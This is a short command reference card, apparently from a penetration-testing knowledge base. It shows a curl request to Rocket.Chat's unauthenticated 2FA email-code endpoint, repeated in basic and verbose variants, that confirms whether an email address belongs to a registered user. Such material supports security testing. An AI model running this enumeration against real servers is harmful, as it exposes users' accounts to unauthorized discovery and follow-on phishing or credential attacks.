---
data: >-
  curl -X POST http://rocket-chat.local:3000/api/v1/users.2fa.sendEmailCode -H
  "Content-Type: application/json" -d '{"emailOrUsername":"test@test.test"}'
tags:
  - information-disclosure
  - email-enumeration
type: command
output: '{"success":true}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:19.140Z'
id: 985f039d-6363-4659-ae58-0ebcda49f913
verified: false
validated: true
submitted: true
---
# curl-rocket-chat-valid-email-enumeration

## Command

```bash
curl -X POST http://rocket-chat.local:3000/api/v1/users.2fa.sendEmailCode -H "Content-Type: application/json" -d '{"emailOrUsername":"test@test.test"}'
```

## Description

This command sends a POST request to the Rocket.Chat 2FA endpoint with a valid email address in the emailOrUsername parameter, triggering a success response that confirms the user's existence without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `http://rocket-chat.local:3000/api/v1/users.2fa.sendEmailCode` | Target endpoint URL (replace with actual host) | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type header | Yes |
| `-d '{"emailOrUsername":"test@test.test"}'` | JSON payload with email to test (use suspected valid email) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target:3000/api/v1/users.2fa.sendEmailCode -H "Content-Type: application/json" -d '{"emailOrUsername":"user@example.com"}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST http://target:3000/api/v1/users.2fa.sendEmailCode -H "Content-Type: application/json" -d '{"emailOrUsername":"user@example.com"}'
```

## Expected Output

HTTP/1.1 200 OK followed by {"success":true}, indicating the email is registered in the system.

## Related

- [[commands/curl-rocket-chat-invalid-email-enumeration]]
- [[procedures/Email-Enumeration-via-Rocket-Chat-2FA-Endpoint]]
